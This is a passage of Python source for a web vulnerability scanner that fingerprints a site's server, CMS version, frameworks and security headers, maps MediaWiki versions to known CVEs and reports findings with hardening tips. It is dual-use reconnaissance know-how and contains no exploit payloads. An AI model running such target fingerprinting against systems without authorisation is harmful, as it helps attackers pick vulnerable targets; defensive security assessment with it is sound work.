        x_powered_lower = fingerprint['x_powered_by'].lower()
        if 'php' in x_powered_lower or 'php' in server_lower:
            fingerprint['programming_languages'].append('PHP')
        if 'asp.net' in server_lower or 'asp.net' in x_powered_lower:
            fingerprint['programming_languages'].append('ASP.NET')
        if 'python' in server_lower or 'python' in x_powered_lower or 'django' in x_powered_lower:
            fingerprint['programming_languages'].append('Python')
        if 'ruby' in server_lower or 'ruby' in x_powered_lower:
            fingerprint['programming_languages'].append('Ruby')
        if 'node' in server_lower or 'node.js' in x_powered_lower:
            fingerprint['programming_languages'].append('Node.js')
        if 'java' in server_lower or 'java' in x_powered_lower or 'tomcat' in server_lower:
            fingerprint['programming_languages'].append('Java')
        if 'go' in server_lower or 'go' in x_powered_lower:
            fingerprint['programming_languages'].append('Go')
        if 'rust' in server_lower or 'rust' in x_powered_lower:
            fingerprint['programming_languages'].append('Rust')
        
        soup = BeautifulSoup(content, 'html.parser')
        generator_meta = soup.find('meta', {'name': 'generator'})
        if generator_meta:
            fingerprint['generator'] = generator_meta.get('content', 'Unknown')
        
        content_lower = content.lower()
        if 'wp-content' in content_lower or 'wordpress' in content_lower:
            fingerprint['cms_guess'] = 'WordPress'
            # WordPress version detection
            wp_version_match = re.search(r'wp-embed\.min\.js\?ver=(\d+\.\d+\.\d+)', content_lower) or \
                              re.search(r'version (\d+\.\d+\.\d+)', fingerprint.get('generator', '').lower()) or \
                              re.search(r'WordPress (\d+\.\d+\.\d+)', content_lower) or \
                              re.search(r'wp-includes/js/wp-embed\.min\.js\?ver=(\d+\.\d+\.\d+)', content_lower)
            if wp_version_match:
                wp_version = wp_version_match.group(1)
                fingerprint['wordpress_version'] = wp_version
                # Add known vulns for WordPress
                v_parts = list(map(int, wp_version.split('.')))
                if v_parts[0] < 6:
                    fingerprint['known_vulns'].append({'description': 'WordPress version is outdated, potential security risks', 'detected_by': 'version'})
        elif 'joomla' in content_lower:
            fingerprint['cms_guess'] = 'Joomla'
            # Joomla version detection
            joomla_version_match = re.search(r'Joomla! (\d+\.\d+)', content_lower) or \
                                  re.search(r'joomla (\d+\.\d+)', fingerprint.get('generator', '').lower())
            if joomla_version_match:
                fingerprint['joomla_version'] = joomla_version_match.group(1)
        elif 'drupal' in content_lower:
            fingerprint['cms_guess'] = 'Drupal'
            # Drupal version detection
            drupal_version_match = re.search(r'Drupal (\d+)', content_lower) or \
                                  re.search(r'drupal (\d+)', fingerprint.get('generator', '').lower())
            if drupal_version_match:
                fingerprint['drupal_version'] = drupal_version_match.group(1)
        elif 'magento' in content_lower:
            fingerprint['cms_guess'] = 'Magento'
        elif 'shopify' in content_lower:
            fingerprint['cms_guess'] = 'Shopify'
        elif 'wix' in content_lower:
            fingerprint['cms_guess'] = 'Wix'
        elif 'squarespace' in content_lower:
            fingerprint['cms_guess'] = 'Squarespace'
        elif 'ghost' in content_lower:
            fingerprint['cms_guess'] = 'Ghost'
        elif 'typo3' in content_lower:
            fingerprint['cms_guess'] = 'TYPO3'
        elif 'blogger' in content_lower:
            fingerprint['cms_guess'] = 'Blogger'
        elif 'umbraco' in content_lower:
            fingerprint['cms_guess'] = 'Umbraco'
        elif 'concrete5' in content_lower:
            fingerprint['cms_guess'] = 'Concrete5'
        elif 'mediawiki' in content_lower:
            fingerprint['cms_guess'] = 'MediaWiki'
        elif 'silverstripe' in content_lower:
            fingerprint['cms_guess'] = 'SilverStripe'
        elif 'modx' in content_lower:
            fingerprint['cms_guess'] = 'MODX'
        elif 'craftcms' in content_lower:
            fingerprint['cms_guess'] = 'Craft CMS'
        elif 'statamic' in content_lower:
            fingerprint['cms_guess'] = 'Statamic'
        elif 'grav' in content_lower:
            fingerprint['cms_guess'] = 'Grav'
        elif 'pimcore' in content_lower:
            fingerprint['cms_guess'] = 'Pimcore'
        elif 'processwire' in content_lower:
            fingerprint['cms_guess'] = 'ProcessWire'
        elif 'getkirby' in content_lower:
            fingerprint['cms_guess'] = 'Kirby'
        elif 'jekyll' in content_lower or 'github pages' in content_lower:
            fingerprint['cms_guess'] = 'Jekyll (Static)'
        elif 'hugo' in content_lower:
            fingerprint['cms_guess'] = 'Hugo (Static)'
        elif 'next.js' in content_lower:
            fingerprint['cms_guess'] = 'Next.js (Static/SSR)'
        elif 'nuxt' in content_lower:
            fingerprint['cms_guess'] = 'Nuxt.js (Static/SSR)'
        elif 'moodle' in content_lower:
            fingerprint['cms_guess'] = 'Moodle'
        elif 'opencart' in content_lower:
            fingerprint['cms_guess'] = 'OpenCart'
        elif 'prestashop' in content_lower:
            fingerprint['cms_guess'] = 'PrestaShop'
        
        # MediaWiki specific
        if fingerprint['generator'] and 'MediaWiki' in fingerprint['generator']:
            version_match = re.search(r'MediaWiki (\d+\.\d+\.\d+)', fingerprint['generator'])
            if version_match:
                version = version_match.group(1)
                fingerprint['mediawiki_version'] = version
                v_parts = list(map(int, version.split('.')))
                # CVE-2023-45360: 1.35.12, 1.36–1.39.x before 1.39.5
                if (v_parts[0] == 1 and v_parts[1] == 35 and v_parts[2] >= 12) or \
                   (v_parts[0] == 1 and 36 <= v_parts[1] < 39) or \
                   (v_parts[0] == 1 and v_parts[1] == 39 and v_parts[2] < 5):
                    fingerprint['known_vulns'].append({'description': "CVE-2023-45360: Stored XSS via i18n messages", 'detected_by': 'version'})
                # CVE-2023-45362: 1.35.12, 1.36–1.39.x before 1.39.5
                if (v_parts[0] == 1 and v_parts[1] == 35 and v_parts[2] >= 12) or \
                   (v_parts[0] == 1 and 36 <= v_parts[1] < 39) or \
                   (v_parts[0] == 1 and v_parts[1] == 39 and v_parts[2] < 5):
                    fingerprint['known_vulns'].append({'description': "CVE-2023-45362: Information leak in diff engine", 'detected_by': 'version'})
                # Infinite loop: 1.39.x before 1.39.5
                if v_parts[0] == 1 and v_parts[1] == 39 and v_parts[2] < 5:
                    fingerprint['known_vulns'].append({'description': "Infinite loop on self-redirects with variants", 'detected_by': 'version'})
                # API DDoS: 1.39.x
                if v_parts[0] == 1 and v_parts[1] == 39:
                    fingerprint['known_vulns'].append({'description': "API DDoS vulnerabilities (CVE-2025-61641, CVE-2025-61643, CVE-2025-61640)", 'detected_by': 'version'})
                # Private wiki visibility leak: older versions
                if v_parts[0] == 1 and v_parts[1] < 39:
                    fingerprint['known_vulns'].append({'description': "Private wiki visibility leak (CVE-2025-6590)", 'detected_by': 'version'})
        
        # Hardening tips
        if fingerprint['cms_guess'] == 'MediaWiki' and fingerprint['mediawiki_version'] and fingerprint['mediawiki_version'].startswith('1.39'):
            fingerprint['hardening_tips'].extend([
                "Consider rate-limiting access to /w/api.php.",
                "Review extension list and remove unused ones.",
                "Check that the site is updated whenever 1.39.x security releases land."
            ])
        if fingerprint['cms_guess'] == 'WordPress' and fingerprint.get('wordpress_version'):
            v_str = fingerprint['wordpress_version']
            try:
                v_parts = list(map(int, v_str.split('.')))
                if v_parts[0] < 6:
                    fingerprint['hardening_tips'].extend([
                        "Update WordPress to the latest version.",
                        "Use security plugins like Wordfence or Sucuri.",
                        "Regularly update themes and plugins.",
                        "Enable two-factor authentication."
                    ])
            except:
                pass
        if fingerprint['cms_guess'] == 'Joomla' and fingerprint.get('joomla_version'):
            v_str = fingerprint['joomla_version']
            try:
                v_parts = list(map(int, v_str.split('.')))
                if v_parts[0] < 4:
                    fingerprint['hardening_tips'].extend([
                        "Update Joomla to version 4.x or later.",
                        "Use Joomla's built-in security features.",
                        "Install security extensions.",
                        "Regularly backup the site."
                    ])
            except:
                pass
        if fingerprint['cms_guess'] == 'Drupal' and fingerprint.get('drupal_version'):
            v_str = fingerprint['drupal_version']
            try:
                v = int(v_str)
                if v < 9:
                    fingerprint['hardening_tips'].extend([
                        "Upgrade to Drupal 9 or 10.",
                        "Apply security updates promptly.",
                        "Use contributed modules for security.",
                        "Configure proper permissions."
                    ])
            except:
                pass
        
        # Extension vulns
        if 'approvedrevs' in content_lower:
            fingerprint['extension_vulns'].append({'description': "ApprovedRevs extension: Potential stored XSS (check version < 1.39.13, 1.42.7, 1.43.2)", 'detected_by': 'heuristic'})
        if 'embedvideo' in content_lower:
            fingerprint['extension_vulns'].append({'description': "EmbedVideo extension: Potential stored XSS (check version <= 4.0.0)", 'detected_by': 'heuristic'})
        if 'growth experiments' in content_lower or 'growthexperiments' in content_lower:
            fingerprint['extension_vulns'].append({'description': "Growth Experiments extension: Potential XSS (check versions 1.39-1.43)", 'detected_by': 'heuristic'})
        
        # Frontend Frameworks
        if 'data-reactroot' in content or '__REACT_DEVTOOLS_GLOBAL_HOOK__' in content:
            fingerprint['frontend_frameworks'].append('React')
        if '__VUE_DEVTOOLS_GLOBAL_HOOK__' in content or 'v-' in content:
            fingerprint['frontend_frameworks'].append('Vue')
        if 'ng-version' in content:
            fingerprint['frontend_frameworks'].append('Angular')
        if 'svelte' in content_lower:
            fingerprint['frontend_frameworks'].append('Svelte')
        if 'x-data' in content or 'alpine' in content_lower:
            fingerprint['frontend_frameworks'].append('Alpine.js')
        if 'ember' in content_lower:
            fingerprint['frontend_frameworks'].append('Ember.js')
        if 'backbone' in content_lower:
            fingerprint['frontend_frameworks'].append('Backbone.js')
        if 'polymer' in content_lower:
            fingerprint['frontend_frameworks'].append('Polymer')
        if 'mithril' in content_lower:
            fingerprint['frontend_frameworks'].append('Mithril')
        if 'riot' in content_lower:
            fingerprint['frontend_frameworks'].append('Riot.js')
        if 'aurelia' in content_lower:
            fingerprint['frontend_frameworks'].append('Aurelia')
        
        # Ember-specific checks
        if 'ember' in content_lower:
            if '__EMBER_DEVTOOLS_GLOBAL_HOOK__' in content or 'ember-debug' in content_lower:
                fingerprint['known_vulns'].append({'description': 'Ember Debug Tooling Exposed', 'detected_by': 'heuristic'})
            if '{{{unescaped' in content or '{{unescaped' in content:
                fingerprint['known_vulns'].append({'description': 'Potential Unsafe Ember Helpers (unescaped output)', 'detected_by': 'heuristic'})
            if 'this.route(' in content or 'router.map(' in content:
                fingerprint['known_vulns'].append({'description': 'Potential Leaked Ember Routes', 'detected_by': 'heuristic'})
        
        # Backend Frameworks
        if 'laravel' in fingerprint['x_powered_by'].lower() or 'laravel_session' in headers.get('Set-Cookie', ''):
            fingerprint['backend_frameworks'].append('Laravel')
        if 'symfony' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Symfony')
        if 'x-runtime' in headers:
            fingerprint['backend_frameworks'].append('Ruby on Rails')
        if 'csrftoken' in headers.get('Set-Cookie', '') or 'django' in content_lower:
            fingerprint['backend_frameworks'].append('Django')
        if 'express' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Express.js')
        if 'flask' in fingerprint['x_powered_by'].lower() or 'werkzeug' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Flask')
        if 'fastapi' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('FastAPI')
        if 'spring' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Spring')
        if 'play' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Play Framework')
        if 'ktor' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Ktor')
        if 'gin' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Gin (Go)')
        if 'echo' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Echo (Go)')
        if 'rails' in fingerprint['x_powered_by'].lower():
            fingerprint['backend_frameworks'].append('Ruby on Rails')
        
        # CDN / Cloud Services
        if 'cf-ray' in headers:
            fingerprint['cdn_services'].append('Cloudflare')
        if 'akamai' in fingerprint['server'].lower():
            fingerprint['cdn_services'].append('Akamai')
        if 'x-amz-cf-id' in headers:
            fingerprint['cdn_services'].append('AWS CloudFront')
        if 'fastly' in headers:
            fingerprint['cdn_services'].append('Fastly')
        if 'google' in fingerprint['server'].lower():
            fingerprint['cdn_services'].append('Google Cloud CDN')
        
        # E-commerce Platforms
        if 'woocommerce' in content_lower:
            fingerprint['ecommerce_platforms'].append('WooCommerce')
        if 'prestashop' in content_lower:
            fingerprint['ecommerce_platforms'].append('PrestaShop')
        if 'bigcommerce' in content_lower:
            fingerprint['ecommerce_platforms'].append('BigCommerce')
        if 'opencart' in content_lower:
            fingerprint['ecommerce_platforms'].append('OpenCart')
        if 'oscommerce' in content_lower:
            fingerprint['ecommerce_platforms'].append('osCommerce')
        
        # Analytics / Tracking
        if 'googletagmanager' in content_lower or 'gtag' in content_lower:
            fingerprint['analytics_tracking'].append('Google Analytics')
        if 'facebook' in content_lower or 'fbq' in content_lower:
            fingerprint['analytics_tracking'].append('Meta Pixel')
        if 'cloudflareinsights' in content_lower:
            fingerprint['analytics_tracking'].append('Cloudflare Web Analytics')
        if 'matomo' in content_lower or 'piwik' in content_lower:
            fingerprint['analytics_tracking'].append('Matomo / Piwik')
        if 'hotjar' in content_lower:
            fingerprint['analytics_tracking'].append('Hotjar')
        if 'mixpanel' in content_lower:
            fingerprint['analytics_tracking'].append('Mixpanel')
        if 'segment' in content_lower:
            fingerprint['analytics_tracking'].append('Segment')
        if 'plausible' in content_lower:
            fingerprint['analytics_tracking'].append('Plausible')
        if 'amplitude' in content_lower:
            fingerprint['analytics_tracking'].append('Amplitude')
        if 'fullstory' in content_lower:
            fingerprint['analytics_tracking'].append('FullStory')
        if 'crazyegg' in content_lower:
            fingerprint['analytics_tracking'].append('Crazy Egg')
        if 'mouseflow' in content_lower:
            fingerprint['analytics_tracking'].append('Mouseflow')
        if 'chartbeat' in content_lower:
            fingerprint['analytics_tracking'].append('Chartbeat')
        if 'quantcast' in content_lower:
            fingerprint['analytics_tracking'].append('Quantcast')
        if 'comscore' in content_lower:
            fingerprint['analytics_tracking'].append('comScore')
        if 'alexa' in content_lower:
            fingerprint['analytics_tracking'].append('Alexa')
        
        # Security / WAF
        if self.waf_detected:
            fingerprint['security_waf'].append('WAF Detected')
        
        # Miscellaneous
        jquery_match = re.search(r'jquery[/-](\d+\.\d+\.\d+)', content_lower)
        if jquery_match:
            fingerprint['miscellaneous'].append(f"jQuery {jquery_match.group(1)}")
        if 'bootstrap' in content_lower:
            fingerprint['miscellaneous'].append('Bootstrap')
        if 'tailwind' in content_lower:
            fingerprint['miscellaneous'].append('Tailwind')
        if 'fonts.googleapis.com' in content_lower:
            fingerprint['miscellaneous'].append('Google Fonts')
        if 'stripe' in content_lower:
            fingerprint['miscellaneous'].append('Stripe')
        if 'paypal' in content_lower:
            fingerprint['miscellaneous'].append('PayPal')
        if 'braintree' in content_lower:
            fingerprint['miscellaneous'].append('Braintree')
        if 'font-awesome' in content_lower or 'fa-' in content_lower:
            fingerprint['miscellaneous'].append('Font Awesome')
        if 'materialize' in content_lower:
            fingerprint['miscellaneous'].append('Materialize CSS')
        if 'bulma' in content_lower:
            fingerprint['miscellaneous'].append('Bulma')
        if 'foundation' in content_lower:
            fingerprint['miscellaneous'].append('Foundation')
        if 'semantic-ui' in content_lower:
            fingerprint['miscellaneous'].append('Semantic UI')
        if 'uikit' in content_lower:
            fingerprint['miscellaneous'].append('UIkit')
        if 'axios' in content_lower:
            fingerprint['miscellaneous'].append('Axios')
        if 'lodash' in content_lower:
            fingerprint['miscellaneous'].append('Lodash')
        if 'moment' in content_lower:
            fingerprint['miscellaneous'].append('Moment.js')
        if 'chart.js' in content_lower:
            fingerprint['miscellaneous'].append('Chart.js')
        if 'd3' in content_lower:
            fingerprint['miscellaneous'].append('D3.js')
        if 'leaflet' in content_lower:
            fingerprint['miscellaneous'].append('Leaflet')
        if 'mapbox' in content_lower:
            fingerprint['miscellaneous'].append('Mapbox')
        if 'disqus' in content_lower:
            fingerprint['miscellaneous'].append('Disqus')
        if 'recaptcha' in content_lower:
            fingerprint['miscellaneous'].append('reCAPTCHA')
        if 'hcaptcha' in content_lower:
            fingerprint['miscellaneous'].append('hCaptcha')
        
        # Security Headers
        fingerprint['security_headers'] = {
            'Content-Security-Policy': headers.get('Content-Security-Policy', 'Missing'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'Missing'),
            'X-Frame-Options': headers.get('X-Frame-Options', 'Missing'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Missing'),
            'Referrer-Policy': headers.get('Referrer-Policy', 'Missing'),
            'Permissions-Policy': headers.get('Permissions-Policy', 'Missing'),
            'X-XSS-Protection': headers.get('X-XSS-Protection', 'Missing')
        }
        
        # SSL
        fingerprint['ssl_enabled'] = target.startswith('https://')
        
        # Risk Score and Recommendations
        risk_score = 0
        recommendations = []
        critical_headers = ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options']
        for header in critical_headers:
            if fingerprint['security_headers'][header] == 'Missing':
                risk_score += 15
                if header == 'Content-Security-Policy':
                    recommendations.append("Implement a Content Security Policy (CSP) to prevent XSS and other injection attacks.")
                elif header == 'Strict-Transport-Security':
                    recommendations.append("Enable HTTP Strict Transport Security (HSTS) with 'max-age=31536000; includeSubDomains; preload'.")
                elif header == 'X-Frame-Options':
                    recommendations.append("Set X-Frame-Options to 'DENY' or 'SAMEORIGIN' to prevent clickjacking.")
                elif header == 'X-Content-Type-Options':
                    recommendations.append("Set X-Content-Type-Options to 'nosniff' to prevent MIME type sniffing.")
        if not fingerprint['ssl_enabled']:
            risk_score += 20
            recommendations.append("Enforce HTTPS for all connections.")
        fingerprint['risk_score'] = min(risk_score, 100)
        fingerprint['recommendations'] = recommendations
        
        # Robots.txt and Sitemap
        try:
            robots_url = urljoin(target, '/robots.txt')
            robots_response = self.session.get(robots_url, timeout=5, verify=self.verify_ssl)
            self._inc_requests()
            if robots_response.status_code == 200:
                fingerprint['robots_txt'] = 'Present'
                disallowed = [line.split(':', 1)[1].strip() for line in robots_response.text.split('\n') if line.lower().startswith('disallow:') and ':' in line]
                fingerprint['robots_disallowed'] = disallowed[:10]
            else:
                fingerprint['robots_txt'] = 'Missing'
        except RuntimeError as e:
            if "Max requests exceeded" in str(e):
                fingerprint['robots_txt'] = 'Unknown (max requests reached)'
            else:
                fingerprint['robots_txt'] = 'Error'
        except Exception:
            fingerprint['robots_txt'] = 'Error'
        
        try:
            sitemap_url = urljoin(target, '/sitemap.xml')
            sitemap_response = self.session.get(sitemap_url, timeout=5, verify=self.verify_ssl)
            self._inc_requests()
            if sitemap_response.status_code == 200:
                fingerprint['sitemap_xml'] = 'Present'
            else:
                fingerprint['sitemap_xml'] = 'Missing'
        except RuntimeError as e:
            if "Max requests exceeded" in str(e):
                fingerprint['sitemap_xml'] = 'Unknown (max requests reached)'
            else:
                fingerprint['sitemap_xml'] = 'Error'
        except Exception:
            fingerprint['sitemap_xml'] = 'Error'
        
        return fingerprint

def load_banner() -> str:
    """Load a random banner from the banners directory."""
    banner_dir = Path(__file__).parent / "banners"
    banner_files = list(banner_dir.glob("*.txt"))
    if not banner_files:
        return "Common Web Application Vulnerability Scanner"
    try:
        with random.choice(banner_files).open("r", encoding="utf-8") as f:
            return f.read()
    except UnicodeDecodeError as e:
        logger.warning("Failed to decode banner file: %s", e)
        return "Common Web Application Vulnerability Scanner"

class Reporter:
    """Handles output formatting and reporting."""

    def __init__(self):
        pass

    def display_results(self, results: List[Tuple[str, str, List[Tuple[str, str, float, str, int]], str, str]], waf_detected: bool, requests_count: int, time_taken: float):
        """Display scan results in a formatted table with matched strings and confidence."""
        if not results:
            print("\nNo vulnerabilities found at or above selected minimum severity.")
            return
        severity_order = {'low': 0, 'medium': 1, 'high': 2, 'critical': 3}
        results.sort(key=lambda r: (-severity_order.get(r[4], 1), -max([m[2] for m in r[2]] or [0])))
        headers = [Fore.YELLOW + "Vulnerability" + Style.RESET_ALL, Fore.YELLOW + "Status" + Style.RESET_ALL, Fore.YELLOW + "Confidence" + Style.RESET_ALL, Fore.YELLOW + "Match Type" + Style.RESET_ALL, Fore.YELLOW + "Detected By" + Style.RESET_ALL, Fore.YELLOW + "Severity" + Style.RESET_ALL]
        table_data = [
            (name, status, f"{max([m[2] for m in matches] or [0]):.0%}" if matches else "N/A", ", ".join(set(m[3] for m in matches)) if matches else "N/A", detected_by, severity)
            for name, status, matches, detected_by, severity in results
        ]
        print("\n" + Fore.CYAN + "Vulnerability Scan Results:" + Style.RESET_ALL + "\n")
        print(tabulate(table_data, headers=headers, tablefmt="grid"))

        if waf_detected:
            print("\n" + Fore.YELLOW + "Warning: Web Application Firewall (WAF) detected. Some active tests were skipped or may be blocked, affecting results." + Style.RESET_ALL)

        print("\n" + Fore.CYAN + "Details of Vulnerable Findings:" + Style.RESET_ALL)
        for name, status, matches, _, severity in results:
            if clean_ansi(status) == "Vulnerable" and matches:
                print(f"\nVulnerability: {name}")
                print("Matched Strings:")
                for context, match, confidence, match_type, count in matches[:5]:
                    display_match = match if len(match) <= 200 else match[:197] + "..."
                    display_context = context if len(context) <= 120 else context[:117] + "..."
                    note = ""
                    if name == "Directory Traversal" and match_type == "Passive":
                        note = "Likely safe relative path in HTML attribute"
                    elif name == "Directory Traversal" and "WAF" in match:
                        note = "Possible false positive due to WAF block"
                    elif name == "Cross-Domain Scripting" and match_type == "Passive":
                        note = "Likely safe script source"
                    elif name == "Cross-Site Script Inclusion (CSSI)" and match_type == "Passive":
                        note = "Likely safe stylesheet source"
                    print(f"- {display_match} (Occurrences: {count}, Context: ...{display_context}..., Confidence: {confidence:.0%}, Type: {match_type}{', Note: ' + note if note else ''})")
                if len(matches) > 5:
                    print(f"... and {len(matches) - 5} more matches")

        print(f"\nScan stats: {requests_count} HTTP requests in {time_taken:.2f} seconds.")

    def export_results(self, results: List[Tuple[str, str, List[Tuple[str, str, float, str, int]], str, str]], output_file: str):
        """Export scan results to JSON or CSV."""
        if output_file.endswith('.json'):
            data = [
                {
                    "Vulnerability": name,
                    "Status": clean_ansi(status),
                    "Confidence": f"{max([m[2] for m in matches] or [0]):.0%}" if matches else "N/A",
                    "MatchType": ", ".join(set(m[3] for m in matches)) if matches else "N/A",
                    "DetectedBy": detected_by,
                    "Severity": severity,
                    "Matches": [
                        (
                            context,
                            match,
                            confidence,
                            match_type,
                            count,
                            "Likely safe relative path in HTML attribute"
                            if name == "Directory Traversal" and match_type == "Passive"
                            else "Possible false positive due to WAF block"
                            if name == "Directory Traversal" and "WAF" in match
                            else "Likely safe script source"
                            if name == "Cross-Domain Scripting" and match_type == "Passive"
                            else "Likely safe stylesheet source"
                            if name == "Cross-Site Script Inclusion (CSSI)" and match_type == "Passive"
                            else ""
                        )
                        for context, match, confidence, match_type, count in matches
                    ],
                }
                for name, status, matches, detected_by, severity in results
            ]
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2)
        elif output_file.endswith('.csv'):
            with open(output_file, 'w', encoding='utf-8', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["Vulnerability", "Status", "Confidence", "Match Type", "Matches", "DetectedBy", "Severity"])
                for name, status, matches, detected_by, severity in results:
                    status_clean = clean_ansi(status)
                    confidence = f"{max([m[2] for m in matches] or [0]):.0%}" if matches else "N/A"
                    match_type = ", ".join(set(m[3] for m in matches)) if matches else "N/A"
                    matches_str = "; ".join([
                        f"{m[1]} (Occurrences: {m[4]}, Context: {m[0]}, Confidence: {m[2]:.0%}, Type: {m[3]}, Note: {'Likely safe relative path in HTML attribute' if name == 'Directory Traversal' and m[3] == 'Passive' else 'Possible false positive due to WAF block' if name == 'Directory Traversal' and 'WAF' in m[1] else 'Likely safe script source' if name == 'Cross-Domain Scripting' and m[3] == 'Passive' else 'Likely safe stylesheet source' if name == 'Cross-Site Script Inclusion (CSSI)' and m[3] == 'Passive' else ''})"
                        for m in matches
                    ])
                    writer.writerow([name, status_clean, confidence, match_type, matches_str, detected_by, severity])

    def display_fingerprint(self, scanner, page, target, args):
        """Display server fingerprinting information."""
        url, status, content, headers = page
        fingerprint = scanner.fingerprint(content, headers, target)
        print(f"\nServer Fingerprinting:")
        print(f"- Server: {fingerprint['server']}")
        print(f"- X-Powered-By: {fingerprint['x_powered_by']}")
        print(f"- OS Guess: {fingerprint['os_guess']}")
        if fingerprint['programming_languages']:
            print(f"- Programming Languages:")
            for lang in fingerprint['programming_languages']:
                print(f"  - {lang}")
        if fingerprint['generator']:
            print(f"- Generator: {fingerprint['generator']}")
        print(f"- CMS Guess: {fingerprint['cms_guess']}")
        if fingerprint.get('wordpress_version'):
            print(f"- WordPress Version: {fingerprint['wordpress_version']}")
        if fingerprint.get('joomla_version'):
            print(f"- Joomla Version: {fingerprint['joomla_version']}")
        if fingerprint.get('drupal_version'):
            print(f"- Drupal Version: {fingerprint['drupal_version']}")
        if fingerprint['mediawiki_version']:
            print(f"- MediaWiki Version: {fingerprint['mediawiki_version']}")
        if fingerprint['known_vulns']:
            print(f"- Known Vulnerabilities:")
            for vuln in fingerprint['known_vulns']:
                print(f"  - [{vuln['detected_by'].upper()}] {vuln['description']}")
        if fingerprint['extension_vulns']:
            print(f"- Potential Extension Vulnerabilities:")
            for vuln in fingerprint['extension_vulns']:
                print(f"  - [{vuln['detected_by'].upper()}] {vuln['description']}")
        if fingerprint['frontend_frameworks']:
            print(f"- Frontend Frameworks:")
            for fw in fingerprint['frontend_frameworks']:
                print(f"  - {fw}")
        if fingerprint['backend_frameworks']:
            print(f"- Backend Frameworks:")
            for bw in fingerprint['backend_frameworks']:
                print(f"  - {bw}")
        if fingerprint['cdn_services']:
            print(f"- CDN / Cloud Services:")
            for cdn in fingerprint['cdn_services']:
                print(f"  - {cdn}")
        if fingerprint['ecommerce_platforms']:
            print(f"- E-commerce Platforms:")
            for ec in fingerprint['ecommerce_platforms']:
                print(f"  - {ec}")
        if fingerprint['analytics_tracking']:
            print(f"- Analytics / Tracking:")
            for at in fingerprint['analytics_tracking']:
                print(f"  - {at}")
        if fingerprint['security_waf']:
            print(f"- Security / WAF:")
            for sec in fingerprint['security_waf']:
                print(f"  - {sec}")
        if fingerprint['miscellaneous']:
            print(f"- Miscellaneous:")
            for misc in fingerprint['miscellaneous']:
                print(f"  - {misc}")
        
        if fingerprint['security_headers']:
            print(f"- Security Headers:")
            for header, value in fingerprint['security_headers'].items():
                status = "Present" if value != 'Missing' else "Missing"
                print(f"  - {header}: {status}")
        
        print(f"- SSL Enabled: {fingerprint['ssl_enabled']}")
        print(f"- Robots.txt: {fingerprint['robots_txt']}")
        if 'robots_disallowed' in fingerprint and fingerprint['robots_disallowed']:
            print(f"  - Disallowed Paths: {', '.join(fingerprint['robots_disallowed'][:5])}")
        print(f"- Sitemap.xml: {fingerprint['sitemap_xml']}")
        
        if fingerprint['hardening_tips']:
            print(f"- Hardening Tips:")
            for tip in fingerprint['hardening_tips']:
                print(f"  - {tip}")
        
        print(f"- Risk Score: {fingerprint['risk_score']}/100")
        
        if fingerprint['recommendations']:
            print(f"- Recommendations:")
            for rec in fingerprint['recommendations']:
                print(f"  - {rec}")
        
        if args.export_fingerprint:
            with open(args.export_fingerprint, 'w', encoding='utf-8') as f:
                json.dump(fingerprint, f, indent=2)
            print(f"\nFingerprint exported to {args.export_fingerprint}")


def main():
    """Main function to run the scanner."""
    parser = argparse.ArgumentParser(
        description="Common Web Application Vulnerability Scanner"
    )
    parser.add_argument("target", help="URL or IP address to scan")
    parser.add_argument("--output", help="Output file (JSON or CSV)")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--max-pages", type=int, default=5, help="Maximum number of pages to crawl")
    parser.add_argument("--max-requests", type=int, default=500, help="Maximum number of requests to make")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests (seconds)")
    parser.add_argument("--passive", action="store_true", help="Perform only passive scanning")
    parser.add_argument("--user-agent", help="Custom user agent string")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy:port)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--vuln-file", help="Path to custom vulnerabilities JSON file")
    parser.add_argument("--log-file", help="Path to log file")
    parser.add_argument("--export-fingerprint", help="Export fingerprint to JSON file")
    parser.add_argument("--profile", choices=["fast", "thorough"], help="Scan profile: fast (passive, 1 page) or thorough (active, 10 pages)")
    parser.add_argument("--min-severity", choices=["low", "medium", "high", "critical"], default="low", help="Minimum severity level to report")
    args = parser.parse_args()

    if args.profile == 'fast':
        args.passive = True
        args.max_pages = 1
    elif args.profile == 'thorough':
        args.passive = False
        args.max_pages = 10

    setup_logging(args.debug, args.log_file)
    
    init()
    print(Fore.CYAN + load_banner() + Style.RESET_ALL)
    print("\n" + Fore.YELLOW + "THESE RESULTS MAY NOT BE 100% CORRECT!" + Style.RESET_ALL)
    print(Fore.MAGENTA + "Developed By " + Fore.CYAN + "SirCryptic" + Style.RESET_ALL + "\n")
    print(Fore.RED + "Use only on systems you are authorized to test." + Style.RESET_ALL)

    try:
        scanner = WebVulnScanner(request_delay=args.delay, custom_ua=args.user_agent, proxy=args.proxy, passive=args.passive, no_verify=args.no_verify, vuln_file=args.vuln_file, max_requests=args.max_requests)
        logger.info("Scanning target: %s", args.target)
        
        start_time = time.time()
        scanner.waf_detected = scanner.detect_waf(args.target)
        
        pages = scanner.crawl_pages(args.target, max_pages=args.max_pages)
        if not pages:
            logger.error("No pages successfully crawled from %s", args.target)
            sys.exit(1)

        print("Checking vulnerabilities across crawled pages...")
        results = scanner.check_vulnerabilities(pages)
        severity_order = {'low': 0, 'medium': 1, 'high': 2, 'critical': 3}
        min_rank = severity_order[args.min_severity]
        results = [r for r in results if severity_order.get(r[4], 1) >= min_rank]
        end_time = time.time()
        reporter = Reporter()
        reporter.display_results(results, scanner.waf_detected, scanner.requests_count, end_time - start_time)
        
        if args.output:
            reporter.export_results(results, args.output)

        print(f"\nScan completed in {end_time - start_time:.2f} seconds.")
